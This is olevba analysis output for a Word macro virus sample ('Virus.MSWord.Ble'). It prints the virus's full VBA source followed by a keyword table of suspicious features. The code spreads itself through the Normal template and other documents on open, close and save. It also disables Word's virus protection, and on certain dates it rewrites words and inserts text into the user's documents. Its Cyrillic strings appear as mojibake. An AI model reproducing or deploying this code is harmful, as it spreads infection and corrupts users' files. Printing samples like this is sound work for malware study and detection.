olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ble-6d214cdb0dd6057681c4437116a2d7102edb9edb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ble-6d214cdb0dd6057681c4437116a2d7102edb9edb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: Virus.MSWord.Ble-6d214cdb0dd6057681c4437116a2d7102edb9edb - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Public sz As Long
Public k As Long
Public NoSpecial As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Bls$(3)



Sub AutoOpen()
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close SaveChanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
 RunOtherMacro MacN:="AutoOpen"
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function
Sub RunOtherMacro(MacN As String)
 On Error GoTo Run_Error
 For Each Mac In ActiveDocument.VBProject.VBComponents
   If (Mac.Type = 1) And (Mac.Name <> "MacroBle") Then
    Application.Run "project." + Mac.Name + "." + MacN
Skip_Error:
   End If
  Next Mac
 GoTo End_Run
Run_Error:
 Resume Skip_Error
End_Run:

End Sub

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then Optimize
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
 RunOtherMacro MacN:="AutoClose"
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "渾"
 ends$(1, 2) = "謫�""
 ends$(1, 3) = "佃�""
 ends$(1, 4) = "忽"
 ends$(1, 5) = "佃"
 ends$(1, 6) = "��"
 ends$(1, 7) = "迹"
 ends$(1, 8) = "策"
 ends$(1, 9) = "酷"
 ends$(1, 10) = "紅"
 ends$(1, 11) = "忽�""
 ends$(1, 12) = "赤"
 ends$(2, 1) = "僥"
 ends$(2, 2) = "憶�""
 ends$(2, 3) = "諺�""
 ends$(2, 4) = "夭"
 ends$(2, 5) = "諺"
 ends$(2, 6) = "彦"
 ends$(2, 7) = "猥"
 ends$(2, 8) = "撓"
 ends$(2, 9) = "夭"
 ends$(2, 10) = "夭�""
 ends$(2, 11) = "檍"
 ends$(2, 12) = "��"
 
 Moora1$(1) = "出億"
 Moora1$(2) = "齬陝寀"
 Moora1$(3) = "莘杖�""
 Moora1$(4) = "鴨訟蟻�""
 Moora1$(5) = "壬菴杷"
 Moora1$(6) = "春孼荻"
 Moora1$(7) = "涯灑�""
 Moora1$(8) = "櫛町外"
 Moora1$(9) = "惟���""
 Moora1$(10) = "愴誼哀杷"
 
 Moora1$(11) = "渟崖堯茴"
 Moora1$(12) = "莘純��""
 Moora1$(13) = "惟俉妖"
 Moora1$(14) = "齬泣�""
 Moora1$(15) = "齬陝"
 Moora1$(16) = "炡醴陝寀"
 Moora1$(17) = "穽巍債廛�""
 Moora1$(18) = "鋪裔腸�""
 Moora1$(19) = "臣埰�""
 Moora1$(20) = "增釣日"
 
 Moora1$(21) = "臣埰設"
 Moora1$(22) = "膣禎終�""
 Moora1$(23) = "魏壯泣裔打佺�""
 Moora1$(24) = "淳豫泣�""
 Moora1$(25) = "衆俺廛燮"
 Moora1$(26) = "穽化設"
 Moora1$(27) = "躁剪�""
 Moora1$(28) = "仲依杷"
 Moora1$(29) = "債賊泣�""
 Moora1$(30) = "灑尊菴脣杷"
 
 Moora1$(31) = "翟增宗鎚牆"
 Moora1$(32) = "張狀鏃贍茴"
 Moora1$(33) = "町�侁�"""
 Moora1$(34) = "惟��杷"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "竣妖��""
 Moora2$(2) = "奠暢馴"
 Moora2$(3) = "脣長�""
 Moora2$(4) = "奠暢循��"""
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Bls$(1) = "頌�"
 Bls$(2) = "� 壯膣釣"
 Bls$(3) = "軫澱 茵潗"
 
End Sub

Sub Optimize()
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "擒�" Then
  sz = ActiveDocument.Words.Count
  Changed = False
  Optima = 0
  If sz <= 500 Then
   For k = 1 To sz
    tss$ = ActiveDocument.Words.Item(k)
    Application.StatusBar = "淃押剪荻魏 � 櫛春陝孼療: " + Str$(k \ 5) + "%"
    If Len(tss$) > 4 Then GoSub Do_Trunslate
   Next k
  Else
   li = 1
   While li < 100
    k = Int(sz * Rnd + 1)
    tss$ = ActiveDocument.Words.Item(k)
    If Len(tss$) > 4 Then
     GoSub Do_Trunslate
     li = li + 1
     Application.StatusBar = "淃押剪荻魏 � 櫛春陝孼療: " + Str$(li) + "%"
    End If
   Wend
  End If
  Application.StatusBar = "淃押剪荻魏 裔橓淙孼�. 膠震麟裔打�: " + Str$(Optima) + "%"
 End If
  GoTo end_proc
  
Do_Trunslate:
   tss$ = TrunslateWord(tss$)
   If Changed Then
    ActiveDocument.Words(k) = tss$
    Changed = False
    Optima = Optima + 1
   End If
  Return
end_proc:
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 spaces = CheckSpace(ts)
 If spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - spaces)
 Lts = Len(ts)
 If Lts > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    i = 1
    While i <= 12
     CEnd$ = ends$(c, i)
     MyEnd$ = Mid$(ts, Lts - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If spaces <> 0 Then tw$ = tw$ + Space(spaces)
      FLett = Mid$(ts, 1, 1)
      If UCase$(FLett) = FLett Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      i = 12
      c = 2
     End If
     i = i + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function


Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 NoSpecial = True
 atj$ = LCase$(Mid$(adj, 1, 5))
 Select Case atj$
  Case "臆抑�""
   NoSpecial = False
  Case "雪涉�""
   NoSpecial = False
  Case "債荻�""
   NoSpecial = False
  Case "壯茁�""
   NoSpecial = False
 End Select
 If NoFuckenError(atj$) Then
  Set mySynInfo = SynonymInfo(adj)
  myPos = mySynInfo.PartOfSpeechList
  i = UBound(myPos)
  If i >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 Imp
 CheckAdjective = cadj
End Function

Function NoFuckenError(wrd As String) As Boolean
 atj = Mid$(wrd, 1, 1)
 Select Case atj
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
End Select
 NoFuckenError = NoSpecial
End Function

Sub FileSave()
 RunOtherMacro MacN:="FileSave"
 On Error GoTo Save_err
 AutoClose
 ActiveDocument.Save
Save_err:
End Sub

Sub FileSaveAs()
 RunOtherMacro MacN:="FleSaveAs"
 On Error GoTo SaveAs_err
 AutoClose
 Dialogs(wdDialogFileSaveAs).Show
SaveAs_err:
End Sub

Sub FilePrint()
    If MyDate Then
     MakeInsert
     sc = Selection.Sentences.Count
     If sc < 2 Then
      ActiveDocument.Words.Last.InsertAfter (" 찔�, 邱픔텅 ! (end of document)")
     Else
      Selection.Words.Last.InsertBefore (" 憾佃� 桎莘, 涯茵� 循� 壯哀 禎煜� 壯 出�!")
     End If
    End If
    Dialogs(wdDialogFilePrint).Show
   End Sub

Sub ToolsMacro()
 Beep
Rem  Dialogs(wdDialogToolsMacro).Show
End Sub

Sub MakeInsert()
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "擒�" Then
  sz = ActiveDocument.Words.Count
  If sz > 500 Then
   For i = 1 To 50
    Application.StatusBar = "淃押剪荻魏: " + Str$(i * 2)
    k = Int((sz - 1) * Rnd + 1)
    tss$ = RTrim(ActiveDocument.Words(k))
    If Len(tss$) > 4 Then
     tss1$ = RTrim(ActiveDocument.Words(k + 1))
     If Len(tss1$) > 4 Then
     If Int(3 * Rnd + 1) = 1 Then
      blya$ = ", " + Bls$(Int(3 * Rnd + 1)) + ", "
      ActiveDocument.Words(k).InsertAfter (blya$)
     End If
     End If
    End If
   Next i
   Application.StatusBar = "췸桎脣."
  End If
 End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

